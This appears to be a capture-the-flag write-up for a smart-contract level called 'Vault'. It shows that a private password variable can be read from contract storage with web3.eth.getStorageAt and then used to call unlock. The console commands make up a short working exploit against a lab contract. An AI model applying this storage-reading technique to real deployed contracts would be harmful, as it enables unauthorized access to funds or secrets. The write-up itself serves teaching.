# Vault

## Description

At first glance, this contract may look safe. The problem is that just because
a variable is private, doesn't mean we can't get to it, it just means we can't
access it from another smart contract. With `web3.eth.getStorageAt()` we can
easily get the password.

## Command Sequence

```
> await contract.locked()
true
> const password = web3.eth.getStorageAt(instance, 1)
> await contract.unlock(password)
> await contract.locked()
false
```
